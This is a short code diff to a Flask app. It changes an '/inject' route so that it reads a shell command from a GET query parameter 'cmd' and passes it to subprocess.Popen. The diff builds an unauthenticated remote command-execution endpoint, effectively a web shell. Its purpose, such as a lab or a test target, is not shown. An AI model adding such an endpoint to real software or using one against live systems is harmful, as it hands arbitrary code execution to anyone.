@@ -32,11 +32,11 @@ def ping():
     return "pong\n"
 
 
-@app.route("/inject", methods=["POST"])
+@app.route("/inject", methods=["GET"])
 def inject():
-    data = request.get_data()
+    data = request.args.get("cmd")
     logger.info(f"Received injection request from {request.remote_addr}")
-    logger.info(f"Executing command: {data.decode()}")
+    logger.info(f"Executing command: {data}")
     
     try:
         process = subprocess.Popen(
